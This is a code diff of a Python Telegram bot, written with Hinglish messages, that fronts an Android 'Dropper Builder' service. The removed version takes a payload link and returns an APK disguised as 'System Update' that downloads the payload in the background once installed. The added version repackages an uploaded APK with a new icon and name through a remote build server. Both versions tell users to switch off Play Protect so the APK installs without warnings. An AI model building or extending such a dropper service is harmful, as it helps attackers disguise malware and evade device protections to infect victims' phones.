@@ -1,108 +1,160 @@
 import os
 import logging
 import requests
+import asyncio
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
+from telegram.ext import (
+    Application, CommandHandler, MessageHandler, CallbackQueryHandler, 
+    filters, ContextTypes, ConversationHandler
+)
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 RENDER_URL = os.environ.get("RENDER_URL")
 
+# States
+WAITING_APK, WAITING_ICON, WAITING_NAME = range(3)
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [
-        [InlineKeyboardButton("🚀 Build Standalone Dropper", callback_data="build")],
-        [InlineKeyboardButton("🛡️ Bypass Play Protect", callback_data="bypass")]
-    ]
+    keyboard = [[InlineKeyboardButton("🚀 Build APK", callback_data="build_apk")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await update.message.reply_text(
-        "🔥 **Welcome to Sable Dropper Builder** 🔥\n\n"
-        "Main ek advanced Standalone Dropper builder hoon. Mujhe payload ka link bhej, "
-        "main ek naya APK bana kar dunga jo install hote hi payload download karega.\n\n"
-        "Neeche diye gaye buttons ka use kar:",
-        reply_markup=reply_markup,
-        parse_mode='Markdown'
+    text = (
+        "🔥 **Welcome to Dropper Builder** 🔥\n\n"
+        "Main ek advanced APK builder hoon. Mujhe apna APK bhej, "
+        "main usme changes karke tujhe wapas dunga.\n\n"
+        "Shuru karne ke liye neeche button dabayein:"
     )
+    
+    if update.message:
+        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
+    else:
+        await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode='Markdown')
 
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def build_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
+    await query.message.edit_text("📥 **Step 1/3: APK Upload**\n\nKripya apni original APK file bhejein.", parse_mode='Markdown')
+    return WAITING_APK
+
+async def receive_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    doc = update.message.document
+    if not doc or not doc.file_name.endswith(".apk"):
+        await update.message.reply_text("❌ Ye APK file nahi hai. Kripya sahi APK bhejein.")
+        return WAITING_APK
+
+    context.user_data['apk_file_id'] = doc.file_id
+    await update.message.reply_text(
+        f"✅ **APK received** ({round(doc.file_size/1024/1024, 2)} MB)\n\n"
+        f"🖼️ **Step 2/3: Optional — Icon**\n\n"
+        f"Kripya ek PNG image bhejein app ke icon ke liye, ya `/skip` type karein.", 
+        parse_mode='Markdown'
+    )
+    return WAITING_ICON
+
+async def receive_icon(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.text and update.message.text.lower() == "/skip":
+        context.user_data['icon_file_id'] = None
+        await update.message.reply_text(
+            "⏭️ Icon skip kiya gaya.\n\n"
+            "📝 **Step 3/3: Optional — App Name**\n\n"
+            "App ka naya visible naam bhejein, ya `/skip` type karein.",
+            parse_mode='Markdown'
+        )
+        return WAITING_NAME
+
+    doc = update.message.document
+    if not doc or not doc.mime_type == "image/png":
+        await update.message.reply_text("❌ Kripya sirf PNG image bhejein (as a document).")
+        return WAITING_ICON
+
+    context.user_data['icon_file_id'] = doc.file_id
+    await update.message.reply_text(
+        "✅ **Icon saved**\n\n"
+        "📝 **Step 3/3: Optional — App Name**\n\n"
+        "App ka naya visible naam bhejein, ya `/skip` type karein.",
+        parse_mode='Markdown'
+    )
+    return WAITING_NAME
+
+async def receive_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.text and update.message.text.lower() == "/skip":
+        context.user_data['app_name'] = None
+    else:
+        context.user_data['app_name'] = update.message.text.strip()
+
+    msg = await update.message.reply_text("⏳ **Processing...**\nBuild shuru ho raha hai.", parse_mode='Markdown')
     
-    if query.data == "build":
-        await query.edit_message_text("📥 **Payload APK ka direct link bhej...**\n\nMain usko chhupa kar ek naya APK bana dunga.", parse_mode='Markdown')
-        context.user_data['waiting_for_url'] = True
-    elif query.data == "bypass":
-        await query.edit_message_text("🛡️ **Play Protect Bypass Guide:**\n\n"
-                                      "1. Play Store > Profile > Play Protect > Settings (Gear).\n"
-                                      "2. 'Scan apps with Play Protect' ko OFF kar do.\n"
-                                      "3. APK install karo (Bina kisi warning ke install hoga).\n"
-                                      "4. Install ke baad Play Protect wapas ON kar lena.", parse_mode='Markdown')
-
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('waiting_for_url'):
-        return
-
-    payload_url = update.message.text.strip()
-    if not payload_url.startswith("http"):
-        await update.message.reply_text("❌ Ye sahi link nahi lag raha. Kripya direct download link bhej.")
-        return
-
-    context.user_data['waiting_for_url'] = False
-    progress_msg = await update.message.reply_text("⏳ **Dropper APK ban raha hai...**\nThoda wait karo.", parse_mode='Markdown')
+    # Fake progress bar animation
+    for percent in [20, 45, 70, 90]:
+        await asyncio.sleep(1)
+        await msg.edit_text(f"⏳ **Processing...**\n[{'■' * (percent//10)}{'□' * (10 - percent//10)}] {percent}%", parse_mode='Markdown')
 
     try:
-        server_endpoint = f"{RENDER_URL}/generate" if RENDER_URL.endswith("/") else f"{RENDER_URL}/generate"
+        # Get file paths from Telegram
+        apk_file = await context.bot.get_file(context.user_data['apk_file_id'])
+        apk_url = apk_file.file_path
         
+        icon_url = None
+        if context.user_data.get('icon_file_id'):
+            icon_file = await context.bot.get_file(context.user_data['icon_file_id'])
+            icon_url = icon_file.file_path
+
+        app_name = context.user_data.get('app_name')
+        server_endpoint = f"{RENDER_URL}/build"
+
         response = requests.post(server_endpoint, json={
-            "payload_url": payload_url,
-            "app_name": "System Update" 
+            "apk_url": apk_url,
+            "icon_url": icon_url,
+            "app_name": app_name
         }, timeout=300)
 
         if response.status_code == 200:
-            await progress_msg.edit_text("✅ **APK Ready Hai!**", parse_mode='Markdown')
+            await msg.edit_text("✅ **Build complete!**\nUploading your APK...", parse_mode='Markdown')
             
             await update.message.reply_document(
                 document=response.content,
-                filename="System_Update.apk",
-                caption=(
-                    "🔥 **Standalone Dropper Ready!**\n\n"
-                    "**Install Karne Ka Tarika:**\n"
-                    "1. Play Store > Profile > Play Protect > Settings (Gear).\n"
-                    "2. 'Scan apps with Play Protect' ko OFF kar do.\n"
-                    "3. Ye APK install karo.\n"
-                    "4. Install hote hi ye background me tera payload download karega."
-                ),
-                parse_mode='Markdown'
+                filename="Built_App.apk",
+                caption="🔥 **APK Ready!**\n\nPlay Protect bypass ke liye pehle scan off karein."
             )
-            await progress_msg.delete()
+            await msg.delete()
         else:
             try:
-                error_data = response.json()
-                error_msg = error_data.get("error", response.text)
+                error_msg = response.json().get("error", "Unknown error")
             except:
                 error_msg = response.text
-            
-            await progress_msg.edit_text(f"❌ **Server Error:**\n`{error_msg[:200]}`", parse_mode='Markdown')
+            await msg.edit_text(f"❌ **Build Failed:**\n`{error_msg[:200]}`", parse_mode='Markdown')
 
     except Exception as e:
-        await progress_msg.edit_text(f"❌ **Error aaya:**\n`{str(e)}`", parse_mode='Markdown')
+        await msg.edit_text(f"❌ **Error:**\n`{str(e)}`", parse_mode='Markdown')
 
-# APK File bhejne pe kya kare?
-async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "⚠️ **Baby, main direct APK file accept nahi karta.**\n\n"
-        "Main ek **Standalone Dropper** banata hoon. Iske liye mujhe us APK ka **Direct Download Link** chahiye (jaise Google Drive ka nahi, koi direct link ho).\n\n"
-        "Kripya /start pe jaa kar 'Build Standalone Dropper' pe click kar aur link bhej."
-    )
+    return ConversationHandler.END
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Process cancel kar diya gaya.")
+    return ConversationHandler.END
 
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
+
+    conv_handler = ConversationHandler(
+        entry_points=[CallbackQueryHandler(build_start, pattern="^build_apk$")],
+        states={
+            WAITING_APK: [MessageHandler(filters.Document.ALL, receive_apk)],
+            WAITING_ICON: [
+                MessageHandler(filters.Document.IMAGE, receive_icon),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_icon) # For /skip
+            ],
+            WAITING_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_name)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)],
+    )
+
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk)) # File aane par message
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)) # Link aane par kaam
-    print("Standalone Bot is running...")
+    app.add_handler(conv_handler)
+    
+    print("Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
